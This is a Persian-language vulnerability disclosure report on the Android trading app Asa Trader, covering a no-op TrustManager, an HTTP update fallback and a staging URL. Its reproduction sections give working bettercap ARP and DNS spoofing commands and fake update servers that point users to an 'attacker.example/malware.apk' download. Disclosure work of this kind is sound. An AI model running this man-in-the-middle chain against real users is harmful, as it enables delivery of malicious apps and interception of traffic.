#bug_agah.com

```markdown
# گزارش تست نفوذ اپلیکیشن Asa Trader

## اطلاعات هدف

| فیلد | مقدار |
|------|-------|
| نام اپلیکیشن | Asa Trader |
| Package Name | `com.agah.asatrader` |
| نسخه | 3.67.0.69 (versionCode: 3670069) |
| SHA-256 APK | `ffb9f59c7a41213053efc26ed3346f344c400a1f79a85cf80ec5f1af2b1eb66c` |
| حجم | 21 مگابایت |
| minSdkVersion | 16 (Android 4.1) |
| targetSdkVersion | 34 |
| تاریخ تست | 2026-10-20 |
| نوع تست | تحلیل ایستا + تحلیل شبکه |

---

## خلاصه یافته‌ها

| شناسه | عنوان | شدت | CVSS | قابل بهره‌برداری |
|-------|-------|-----|------|-------------------|
| AGH-001 | TrustManager بدون اعتبارسنجی گواهی | MEDIUM | 5.3 | بله (برای دامنه بدون pin) |
| AGH-002 | به‌روزرسانی از HTTP + دستکاری download_url | MEDIUM | 6.1 | بله (نیاز به تعامل کاربر) |
| AGH-003 | staging URL در مسیر OTP | LOW | 2.6 | محدود |

**زنجیره ترکیبی AGH-001 + AGH-002:** CVSS 6.5 — قابل بهره‌برداری در WiFi عمومی

---

## AGH-001 — TrustManager بدون اعتبارسنجی گواهی

### محل آسیب‌پذیری

فایل: `smali/k6/i$b.smali`  
Class: `k6.i$b`  
پیاده‌سازی: `javax.net.ssl.X509TrustManager`

### کد آسیب‌پذیر

```smali
.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
    .locals 1
    const-string v0, "chain"
    invoke-static {p1, v0}, Ljl/l;->f(Ljava/lang/Object;Ljava/lang/String;)V
    const-string p1, "authType"
    invoke-static {p2, p1}, Ljl/l;->f(Ljava/lang/Object;Ljava/lang/String;)V
    return-void
.end method
```

متد `checkServerTrusted` فقط پارامترها را از نظر null بودن بررسی می‌کند و بلافاصله `return-void` می‌زند. هیچ اعتبارسنجی روی زنجیره گواهی، تاریخ انقضا، CN، یا issuer انجام نمی‌شود.

### نحوه تزریق به OkHttpClient

فایل: `smali/k6/i.smali` — متد `j()`

```smali
.method public final j()Lokhttp3/OkHttpClient$Builder;
    const/4 v0, 0x1
    new-array v0, v0, [Ljavax/net/ssl/TrustManager;
    new-instance v1, Lk6/i$b;
    invoke-direct {v1}, Lk6/i$b;-><init>()V
    const/4 v2, 0x0
    aput-object v1, v0, v2
    const-string v1, "SSL"
    invoke-static {v1}, Ljavax/net/ssl/SSLContext;->getInstance(Ljava/lang/String;)Ljavax/net/ssl/SSLContext;
    move-result-object v1
    new-instance v4, Ljava/security/SecureRandom;
    invoke-direct {v4}, Ljava/security/SecureRandom;-><init>()V
    invoke-virtual {v1, v3, v0, v4}, Ljavax/net/ssl/SSLContext;->init([Ljavax/net/ssl/KeyManager;[Ljavax/net/ssl/TrustManager;Ljava/security/SecureRandom;)V
    invoke-virtual {v1}, Ljavax/net/ssl/SSLContext;->getSocketFactory()Ljavax/net/ssl/SSLSocketFactory;
    move-result-object v1
    new-instance v3, Lokhttp3/OkHttpClient$Builder;
```

نکات:
- پروتکل `SSLContext` روی `"SSL"` تنظیم شده (نه `"TLS"`) — پروتکل منسوخ
- TrustManager سفارشی به SSLContext تزریق می‌شود
- SocketFactory حاصل به OkHttpClient داده می‌شود

### مسیر فراخوانی

```
com.agah.trader.Trader (Application) → k6/b → k6/n → k6/i
com.agah.trader.controller.user.UsersPage → k6/b → k6/n → k6/i
com.agah.trader.controller.payment.PaymentsPage → k6/b → k6/n → k6/i
```

فراخوانی مستقیم `k6/i` از `Trader.smali:482` و `UsersPage.smali:971` و `PaymentsPage$a.smali:53`.

### محدودیت بهره‌برداری

در `smali/k6/c.smali`، دو گواهی pin تعریف شده:

```
sha256/bmZv3E8fwpLiIUyJo8hKP1rbpFvPicoMVmmZyVJA1zU=
sha256/lWTjFV8xC+vmUFUFjdKjzOnsjAu0EytN3ud866YNdvE=
```

این pin‌ها برای دامنه‌های زیر اعمال می‌شوند (`smali/k6/b.smali`):

| دامنه | فیلد pin | وضعیت |
|-------|----------|-------|
| `onlineapi.agah.ir` | `k6/b->d` و `k6/b->e` | محافظت‌شده |
| `tseAsaTraderApi.agah.ir` | `k6/b->f` و `k6/b->g` | محافظت‌شده |
| `mobile-static-backup.agah.ir` | — | **بدون pin** |
| `asatrader.ir` | — | بدون pin |

بنابراین TrustManager بدون اعتبارسنجی برای دامنه‌های pin‌شده با CertificatePinner جبران می‌شود، اما برای `mobile-static-backup.agah.ir` هیچ لایه‌ی محافظتی وجود ندارد.

### شرایط بهره‌برداری

مهاجم در همان شبکه WiFi قربانی قرار دارد. برای دامنه `mobile-static-backup.agah.ir` (که در `smali/k6/c.smali:193` استفاده می‌شود) با گواهی self-signed می‌تواند MITM انجام دهد.

### مراحل بازتولید

**پیش‌نیاز:** یک دستگاه کالی و یک دستگاه اندروید (اپ نصب‌شده) روی یک شبکه WiFi مشترک.

**گام ۱ — شناسایی شبکه:**

```bash
sudo ip link set wlan0 up
sudo iw dev wlan0 scan | grep -E "SSID|signal"
ip a show wlan0
```

**گام ۲ — راه‌اندازی ARP Spoof و رهگیری:**

```bash
sudo bettercap -iface wlan0
```

در کنسول bettercap:

```
net.probe on
sleep 15
net.show
set arp.spoof.targets <IP-گوشی-هدف>
arp.spoof on
net.sniff on
```

**گام ۳ — راه‌اندازی سرور HTTPS با گواهی self-signed:**

```bash
mkdir -p /tmp/mitm && cd /tmp/mitm

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
    -days 1 -nodes -subj "/CN=mobile-static-backup.agah.ir"

cat > server.py << 'EOF'
import http.server, ssl, json

RESPONSE = {
    "changelog": [""],
    "code": 999999,
    "download_url": "https://attacker.example/malware.apk",
    "name": "نسخه جدید",
    "state": -1,
    "api_base_url": "https://onlineapi.agah.ir"
}

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(RESPONSE).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("0.0.0.0", 8443), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem", "key.pem")
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
srv.serve_forever()
EOF

sudo python3 server.py
```

**گام ۴ — هدایت DNS قربانی به سرور مهاجم:**

```bash
sudo bettercap -iface wlan0
```

در کنسول:

```
set dns.spoof.domains mobile-static-backup.agah.ir
set dns.spoof.address <IP-کالی>
dns.spoof on
```

**گام ۵ — مشاهده نتیجه:**

در ترمینال سرور MITM، درخواست‌های قربانی ثبت می‌شود. در دستگاه قربانی، هنگام باز کردن اپ، درخواست به `mobile-static-backup.agah.ir` به سرور مهاجم هدایت می‌شود و پاسخ جعلی دریافت می‌کند. چون TrustManager اعتبارسنجی نمی‌کند و برای این دامنه CertificatePinner وجود ندارد، اتصال TLS پذیرفته می‌شود.

### شواهد تأیید در APK

```bash
cat apktool_out/smali/k6/i\$b.smali
```

پاسخ مورد انتظار: متد `checkServerTrusted` بدون هیچ فراخوانی `CertificateException` یا `verify()`.

```bash
grep -A 3 "CertificatePinner;" apktool_out/smali/k6/n.smali
```

پاسخ مورد انتظار:

```
.field public c:Lokhttp3/CertificatePinner;
```

```bash
grep "mobile-static-backup" apktool_out/smali/k6/c.smali
```

پاسخ:

```
apktool_out/smali/k6/c.smali:193: const-string v2, "http://mobile-static-backup.agah.ir/trader/data/update/android.json"
```

---

## AGH-002 — مکانیزم به‌روزرسانی از HTTP با دستکاری download_url

### محل آسیب‌پذیری

فایل: `smali/k6/c.smali` — خط 187 و 193

### کد آسیب‌پذیر

```smali
const/4 v1, 0x3
new-array v1, v1, [Ljava/lang/String;

const/4 v2, 0x0
aput-object v0, v1, v2

const/4 v0, 0x1
const-string v2, "https://static.asatrader.ir/trader/data/update/android.json"
aput-object v2, v1, v0

const/4 v0, 0x2
const-string v2, "http://mobile-static-backup.agah.ir/trader/data/update/android.json"
aput-object v2, v1, v0

invoke-static {v1}, Lxk/m;->g([Ljava/lang/Object;)Ljava/util/List;
move-result-object v0
sput-object v0, Lk6/c;->l:Ljava/util/List;
```

آرایه‌ی URLهای به‌روزرسانی شامل سه آدرس است. آدرس سوم با پروتکل HTTP و بدون TLS است.

### ساختار پاسخ سرور

سرور در حال حاضر به هر دو پروتکل HTTP و HTTPS پاسخ می‌دهد و محتوای زیر را برمی‌گرداند:

```bash
curl -s "http://mobile-static-backup.agah.ir/trader/data/update/android.json"
```

پاسخ:

```json
{
    "changelog": [""],
    "code": 3380018,
    "download_url": "https://m.agah.com/download",
    "name": "نسخه جدید اپلیکیشن آساتریدر...",
    "state": -1,
    "api_base_url": "https://onlineapi.agah.ir"
}
```

فیلد `download_url` در `smali/v4/p5.smali` به‌عنوان فیلد `downloadUrl` تعریف شده و در `smali/o4/r$a.smali` در متد `m0` با فراخوانی `Li2/n;->d()` (که یک Intent VIEW باز می‌کند) استفاده می‌شود.

### کد مصرف‌کننده‌ی download_url

فایل: `smali/o4/r$a.smali` — متد `m0`

```smali
.method public static final m0(Landroid/content/Context;Lv4/p5;Landroid/view/View;)V
    invoke-virtual {p1}, Lv4/p5;->d()Ljava/lang/String;
    move-result-object p1
    invoke-static {p1}, Lsl/o;->p(Ljava/lang/CharSequence;)Z
    if-eqz p2, :cond_0
    const-string p1, "http://"
    :cond_0
    move-object v2, p1
    invoke-static/range {v0 .. v5}, Li2/n;->d(Li2/n;Landroid/content/Context;Ljava/lang/String;Landroid/os/Bundle;ILjava/lang/Object;)V
    return-void
.end method
```

متد `Li2/n;->d()` یک Intent با action VIEW باز می‌کند. مقدار `download_url` که از سرور دریافت شده، به این متد پاس داده می‌شود.

### شرایط بهره‌برداری

مهاجم روی WiFi مشترک، دو آدرس اول (index 0 و index 1) را از دسترس خارج می‌کند (ARP Spoof و drop کردن بسته‌ها یا DNS Spoofing) و آدرس سوم (HTTP) را با پاسخ جعلی جایگزین می‌کند. سپس کاربر روی دیالوگ "به‌روزرسانی" کلیک می‌کند و Intent VIEW با `download_url` مهاجم باز می‌شود.

### مراحل بازتولید

**گام ۱ — راه‌اندازی سرور HTTP جعلی:**

```bash
mkdir -p /tmp/update-mitm && cd /tmp/update-mitm

cat > update_server.py << 'EOF'
import http.server, json

RESPONSE = {
    "changelog": ["تست"],
    "code": 9999999,
    "download_url": "https://attacker.example/malware.apk",
    "name": "نسخه جدید موجود است",
    "state": -1,
    "api_base_url": "https://onlineapi.agah.ir"
}

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(RESPONSE, ensure_ascii=False).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass

http.server.HTTPServer(("0.0.0.0", 80), H).serve_forever()
EOF

sudo python3 update_server.py
```

**گام ۲ — ARP Spoof و مسدودسازی دو آدرس اول:**

```bash
sudo bettercap -iface wlan0
```

در کنسول:

```
set arp.spoof.targets <IP-گوشی-هدف>
arp.spoof on

set dns.spoof.domains static.asatrader.ir,onlineapi.agah.ir
set dns.spoof.address <IP-نامعتبر>
dns.spoof on

set dns.spoof.domains mobile-static-backup.agah.ir
set dns.spoof.address <IP-کالی>
```

**گام ۳ — هدایت HTTP ترافیک به سرور جعلی (بدون نیاز به DNS چون آدرس HTTP است):**

```
set https.proxy.sslstrip true
net.sniff on
```

**گام ۴ — مشاهده نتیجه:**

در دستگاه قربانی، هنگام باز کردن اپ، دو آدرس اول fail می‌شوند (به دلیل DNS Spoof به IP نامعتبر) و آدرس سوم که HTTP است به سرور مهاجم می‌رسد. پاسخ جعلی بازگردانده می‌شود و کاربر دیالوگ "نسخه جدید" را می‌بیند. کلیک روی دکمه‌ی به‌روزرسانی، `download_url` مهاجم را باز می‌کند.

### شواهد تأیید

```bash
curl -s -i "http://mobile-static-backup.agah.ir/trader/data/update/android.json"
```

پاسخ مورد انتظار:

```
HTTP/1.1 200 OK
Content-Type: application/json
...
{"changelog":[""],"code":3380018,"download_url":"https://m.agah.com/download",...}
```

```bash
grep -B 2 -A 2 "mobile-static-backup" apktool_out/smali/k6/c.smali
```

پاسخ:

```
apktool_out/smali/k6/c.smali:193: const-string v2, "http://mobile-static-backup.agah.ir/trader/data/update/android.json"
```

```bash
grep -B 5 -A 10 "Lv4/p5;->d" apktool_out/smali/o4/r\$a.smali
```

پاسخ:

```smali
invoke-virtual {p1}, Lv4/p5;->d()Ljava/lang/String;
move-result-object p1
invoke-static {p1}, Lsl/o;->p(Ljava/lang/CharSequence;)Z
...
invoke-static/range {v0 .. v5}, Li2/n;->d(Li2/n;Landroid/content/Context;Ljava/lang/String;Landroid/os/Bundle;ILjava/lang/Object;)V
```

---

## AGH-003 — وجود staging URL در مسیر OTP

### محل

فایل: `smali/p7/a$a.smali` — خط 27

```smali
const-string p2, "https://stageonlineapi.agah.ir/api/v2/user/verifySecretKey"
```

### فراخوانی

فقط در `com.agah.trader.controller.user.OtpUsersPage.smali:1489` که از `g6/f` (SecretCodeRepository) استفاده می‌کند.

### شرایط

این URL به‌عنوان پارامتر پیش‌فرض (`if-nez p5, :cond_1`) در متد synthetic استفاده می‌شود. مسیر عادی فراخوانی آن در فرآیند تایید کد دوم (SecretCode) در صفحه OTP است.

### شواهد

```bash
grep -n "stageonlineapi" apktool_out/smali/p7/a\$a.smali
```

```bash
grep -rn "Lg6/f;" apktool_out/smali/com/agah/
```

پاسخ:

```
apktool_out/smali/com/agah/trader/controller/user/OtpUsersPage.smali:1489: new-instance v1, Lg6/f;
```

---

## زنجیره حمله ترکیبی — AGH-001 + AGH-002

### سناریو

```
[۱] کاربر در WiFi عمومی (کافه، فرودگاه، هتل) به شبکه متصل است
[۲] مهاجم روی همان WiFi با ابزار bettercap فعال است
[۳] اپلیکیشن Asa Trader در دستگاه قربانی باز می‌شود
[۴] اپ درخواست به سه آدرس به‌روزرسانی می‌فرستد
[۵] مهاجم با ARP Spoof و DNS Spoof دو آدرس اول را fail می‌کند
[۶] اپ به آدرس سوم (HTTP) fallback می‌کند
[۷] مهاجم پاسخ جعلی با download_url مخرب برمی‌گرداند
[۸] TrustManager بدون اعتبارسنجی (AGH-001) در صورت HTTPS نیز مانع نمی‌شود
[۹] کاربر دیالوگ "نسخه جدید" را می‌بیند
[۱۰] کلیک روی دکمه، Intent VIEW با URL مهاجم باز می‌شود
```

### پیش‌نیازها

- حضور فیزیکی مهاجم در همان شبکه WiFi
- ابزار: bettercap، سرور HTTP/HTTPS جعلی
- تعامل کاربر: کلیک روی دکمه "به‌روزرسانی" در دیالوگ

### محدودیت‌ها

- کاربر باید دیالوگ به‌روزرسانی را ببیند و روی دکمه کلیک کند
- مرورگر یا سیستم ممکن است هشدار URL ناشناس دهد
- CertificatePinner برای `onlineapi.agah.ir` و `tseAsaTraderApi.agah.ir` مانع MITM مستقیم روی این دو دامنه می‌شود

---

## شواهد ثبت‌شده در APK

### ۱. TrustManager بدون اعتبارسنجی

```bash
cat apktool_out/smali/k6/i\$b.smali | grep -A 5 "checkServerTrusted"
```

پاسخ:

```smali
.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
    .locals 1
    const-string v0, "chain"
    invoke-static {p1, v0}, Ljl/l;->f(Ljava/lang/Object;Ljava/lang/String;)V
    const-string p1, "authType"
    invoke-static {p2, p1}, Ljl/l;->f(Ljava/lang/Object;Ljava/lang/String;)V
    return-void
.end method
```

### ۲. تزریق TrustManager به OkHttpClient

```bash
grep -B 2 -A 5 "SSLContext;->init" apktool_out/smali/k6/i.smali
```

پاسخ:

```smali
invoke-virtual {v1, v3, v0, v4}, Ljavax/net/ssl/SSLContext;->init([Ljavax/net/ssl/KeyManager;[Ljavax/net/ssl/TrustManager;Ljava/security/SecureRandom;)V
```

### ۳. CertificatePinner برای دو دامنه اصلی

```bash
grep "sha256/" apktool_out/smali/k6/c.smali
```

پاسخ:

```
apktool_out/smali/k6/c.smali:82: const-string v2, "sha256/bmZv3E8fwpLiIUyJo8hKP1rbpFvPicoMVmmZyVJA1zU="
apktool_out/smali/k6/c.smali:87: const-string v3, "sha256/lWTjFV8xC+vmUFUFjdKjzOnsjAu0EytN3ud866YNdvE="
```

### ۴. دامنه بدون pin در آرایه‌ی update

```bash
grep "mobile-static-backup" apktool_out/smali/k6/c.smali
```

پاسخ:

```
apktool_out/smali/k6/c.smali:193: const-string v2, "http://mobile-static-backup.agah.ir/trader/data/update/android.json"
```

### ۵. پاسخ سرور به HTTP و HTTPS

```bash
curl -sI "http://mobile-static-backup.agah.ir/trader/data/update/android.json" | head -3
```

پاسخ:

```
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json
```

```bash
echo | openssl s_client -connect mobile-static-backup.agah.ir:443 2>/dev/null | \
    openssl x509 -noout -subject -issuer -dates
```

پاسخ:

```
subject=CN=*.agah.ir
issuer=C=PL, O=Asseco Data Systems S.A., CN=Certum DV TLS G2 R39 CA
notBefore=Jul 29 08:29:06 2026 GMT
notAfter=Feb 13 08:29:05 2027 GMT
```

### ۶. staging URL در کد

```bash
grep "stageonlineapi" apktool_out/smali/p7/a\$a.smali
```

پاسخ:

```
apktool_out/smali/p7/a$a.smali:27: const-string p2, "https://stageonlineapi.agah.ir/api/v2/user/verifySecretKey"
```

---

## اطلاعات فنی ثبت‌شده

### دامنه‌های موجود در APK

| دامنه | پروتکل | کاربرد در کد |
|-------|--------|-------------|
| `onlineapi.agah.ir` | HTTPS | API production، pin دارد |
| `tseAsaTraderApi.agah.ir` | HTTPS | API test، pin دارد |
| `mobile-static-backup.agah.ir` | HTTP | update check، بدون pin |
| `static.asatrader.ir` | HTTPS | static CDN |
| `static-cdn.asatrader.ir` | HTTPS | static CDN |
| `stageonlineapi.agah.ir` | HTTPS | staging، فقط در OTP |

### اطلاعات گواهی امضا

```bash
apksigner verify --print-certs AsaTrader-v3.67.0.69.apk
```

پاسخ مورد انتظار (بر اساس apksigner):

```
Signer #1 certificate DN: CN=<مقدار>
Signer #1 certificate SHA-256 digest: <مقدار>
```

### فایل‌های dex

```
classes.dex   8,277,316 bytes
classes2.dex  3,007,112 bytes
```

### کتابخانه‌های Native موجود

```
lib/arm64-v8a/libsentry.so
lib/arm64-v8a/libsentry-android.so
lib/arm64-v8a/libmodpdfium.so
lib/arm64-v8a/libjniPdfium.so
```

کتابخانه‌های Native امنیتی (مانند DexGuard، Bangcle، Jiagu) در APK وجود ندارند.

---

## محدودیت‌های تست

- تحلیل ایستا روی APK، بدون اجرا روی دستگاه
- تست شبکه علیه سرورهای عمومی (فقط بررسی پاسخ‌دهی، بدون ارسال payload)
- TrustManager برای دو دامنه اصلی با CertificatePinner جبران می‌شود؛ آسیب‌پذیری فقط برای مسیر بدون pin قابل بهره‌برداری است
- بهره‌برداری از AGH-002 نیاز به تعامل کاربر (کلیک روی دکمه) دارد

---

## پیوست — دستورات بازتولید کامل

```bash
# ۱. استخراج کد آسیب‌پذیر
cd ~/Desktop/bunt/agah
cat apktool_out/smali/k6/i\$b.smali

# ۲. تأیید تزریق TrustManager
grep -A 20 "\.method.*j()Lokhttp3/OkHttpClient\$Builder;" apktool_out/smali/k6/i.smali

# ۳. تأیید URLهای به‌روزرسانی
grep -A 10 "new-array v1, v1, \[Ljava/lang/String;" apktool_out/smali/k6/c.smali | head -20

# ۴. تأیید CertificatePinner
grep "sha256/" apktool_out/smali/k6/c.smali
grep -B 2 -A 2 "Lk6/c;->b()" apktool_out/smali/k6/b.smali

# ۵. تأیید پاسخ‌دهی HTTP سرور
curl -s -i "http://mobile-static-backup.agah.ir/trader/data/update/android.json"

# ۶. تأیید گواهی TLS
echo | openssl s_client -connect mobile-static-backup.agah.ir:443 2>/dev/null | \
    openssl x509 -noout -subject -issuer -dates

# ۷. تأیید staging URL
grep "stageonlineapi" apktool_out/smali/p7/a\$a.smali
```

---

گزارش دهنده 
IT_IRhackeyTEM@proton.me 
